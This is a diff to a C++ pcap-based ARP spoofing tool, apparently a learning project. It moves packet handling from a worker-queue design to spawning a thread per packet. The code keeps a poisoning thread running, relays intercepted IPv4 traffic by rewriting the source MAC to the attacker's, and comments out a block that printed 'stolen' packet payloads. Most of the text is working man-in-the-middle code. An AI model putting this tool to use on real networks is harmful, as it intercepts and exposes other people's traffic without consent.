@@ -12,7 +12,6 @@
 #include <set>
 #include <utility>
 #include <vector>
-#include <queue>
 #include <pthread.h>
 #include <semaphore.h>
 #include <signal.h>
@@ -33,7 +32,7 @@ std::map<uint32_t,mac_addr> ip_to_mac;
 std::map<uint32_t,std::set<uint32_t>> s2t;
 std::map<uint32_t,std::set<uint32_t>> t2s;
 
-std::queue<uint8_t*> Q;
+std::vector<int> proc_manage;
 pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
 sem_t sem;
 
@@ -53,13 +52,13 @@ void sigintHandler(int sig)
 	if(sigint_flag)
 		exit(0);
 	pthread_mutex_lock(&stdoutmutex);
-	std::cout<<"\nterminate process started : it will take about 5~10 second \ninterupt again for forced exit"<<std::endl;
+	std::cout<<"\nterminate process started : it will take about 5 second \ninterupt again for forced exit"<<std::endl;
 	pthread_mutex_unlock(&stdoutmutex);
 	sigint_flag=1;
 }
 void setsigint(){
 	if (signal(SIGINT, sigintHandler) == SIG_ERR){
-		printf("signal setting error\n");
+		printf("signal SIGINT");
 		exit(1);
 	}
 }
@@ -135,6 +134,7 @@ void process_ip(ipv4_eth* packet,int len){
 		&&ip_to_mac.find(packet->tip.word)==ip_to_mac.end())
 			return;
 	
+	/*
 	pthread_mutex_lock(&stdoutmutex); // display stolen packet..or we can just use wireshark
 	std::cout<<"[+]"<<std::string(packet->sip)<<" -> "<<std::string(packet->tip)<<" : "<<len<<"bytes\n";
 	int plen=len;if(plen>100)plen=100;
@@ -143,6 +143,7 @@ void process_ip(ipv4_eth* packet,int len){
 		std::cout<< (isprint(str[i])?str[i]:'.');
 	std::cout<<'\n'<<std::endl;
 	pthread_mutex_unlock(&stdoutmutex);
+	*/
 	
 	packet->src = my_mac;
 	if(ip_to_mac.find(packet->tip.word)!=ip_to_mac.end())
@@ -155,28 +156,26 @@ void process_ip(ipv4_eth* packet,int len){
 	pthread_mutex_unlock(&omutex);
 }
 
-void* process_packet(void* nevermind){
-	for(;;){
-		sem_wait(&sem);
-		pthread_mutex_lock(&mutex);
-		uint8_t* param=Q.front();Q.pop();
-		pthread_mutex_unlock(&mutex);
-		if(param==nullptr)
-			return nullptr;
-		int len = 0[(uint32_t*)param];
-		arp_eth_ipv4* arp=(arp_eth_ipv4*)(4+param);
-		if(arp->is_valid()){ // actually, test ethertype
-			process_arp(arp);
-		}
-		else if(!sigint_flag){
-			ipv4_eth* ipv4=(ipv4_eth*)(4+param);
-			if(ipv4->is_valid()){
-				process_ip(ipv4,len);
-			}
-			//nothing to do when it is neither ipv4 nor arp
-		}
-		free(param);
+void* process_packet(void* param){
+	int idx = 0[(uint32_t*)param];
+	int len = 1[(uint32_t*)param];
+	arp_eth_ipv4* arp=(arp_eth_ipv4*)(8+(uint8_t*)param);
+	if(arp->is_valid()){ // actually, test ethertype
+		process_arp(arp);
 	}
+	else if(!sigint_flag){
+		ipv4_eth* ipv4=(ipv4_eth*)(8+(uint8_t*)param);
+		if(ipv4->is_valid()){
+			process_ip(ipv4,len);
+		}
+		//nothing to do when it is neither ipv4 nor arp
+	}
+	free(param);
+	pthread_mutex_lock(&mutex);
+	proc_manage.push_back(idx);
+	pthread_mutex_unlock(&mutex);
+	sem_post(&sem);
+	return nullptr;
 }
 
 void* continue_poisoning(void* param){
@@ -217,7 +216,7 @@ int main(int c,char **v){
 		printf("pcap error : %s\n",errbuf);
 		exit(1);
 	}
-	ohandle=pcap_open_live(v[1],0,0,0,errbuf); // output only handle
+	ohandle=pcap_open_live(v[1],0,0,0,errbuf);
 	if(ohandle==nullptr){
 		printf("pcap error : %s\n",errbuf);
 		exit(1);
@@ -226,20 +225,18 @@ int main(int c,char **v){
 	for(int i=2;i<c;i++)
 		add_ip(v[i],handle);
 	pthread_t th[core_num];
+	int usedth[core_num]={0};
 	void * nevermind;
-	sem_init(&sem, 0, 0);
+	for(int i=1;i<core_num;i++)
+		proc_manage.push_back(i);
+	sem_init(&sem, 0, core_num-1);
 	setsigint();
 	
 	if(pthread_create(th,NULL,continue_poisoning,&stpairs)){
 		printf("thread error\n");
 		exit(1);
 	}
-	for(int i=1;i<core_num;i++){
-		if(pthread_create(th+i,NULL,process_packet,nullptr)){
-			printf("thread error\n");
-			exit(1);
-		}
-	}
+	
 	while(sigint_flag<2){
 		pcap_pkthdr* hdr;
 		const uint8_t* ptr;
@@ -247,34 +244,36 @@ int main(int c,char **v){
 			printf("pcap listing failed\n");
 			exit(1);
 		}
-		
+		sem_wait(&sem);
+		pthread_mutex_lock(&mutex);
+		int idx=proc_manage.back();proc_manage.pop_back();
+		pthread_mutex_unlock(&mutex);
 		int len=hdr->caplen;
-		uint8_t* packet=(uint8_t*)malloc(len+4);
+		uint8_t* packet=(uint8_t*)malloc(len+8);
 		
 		if(packet==nullptr){
 			printf("malloc failed\n");
 			exit(1);
 		}
 		
-		memcpy(packet+4,ptr,len);
-		0[(uint32_t*)packet]=len;
+		memcpy(packet+8,ptr,len);
+		0[(uint32_t*)packet]=idx;
+		1[(uint32_t*)packet]=len;
 		
-		pthread_mutex_lock(&mutex);
-		Q.push(packet);
-		pthread_mutex_unlock(&mutex);
-		sem_post(&sem);
+		if(usedth[idx])
+			pthread_join(th[idx], &nevermind);
+		else usedth[idx]=1;
+		if(pthread_create(th+idx,NULL,process_packet,packet)){
+			printf("thread error\n");
+			exit(1);
+		}
 	}
 	
 	sem_destroy(&sem);
 	pthread_join(th[0], &nevermind);
-	for(int i=1;i<core_num;i++){
-		pthread_mutex_lock(&mutex);
-		Q.push(nullptr);
-		pthread_mutex_unlock(&mutex);
-		sem_post(&sem);
-	}
-	for(int i=1;i<core_num;i++)
-		pthread_join(th[i], &nevermind);
+	for(int i=0;i<core_num;i++)
+		if(usedth[i])
+			pthread_join(th[i], &nevermind);
 	pcap_close(handle);
 	pcap_close(ohandle);
 	return 0;
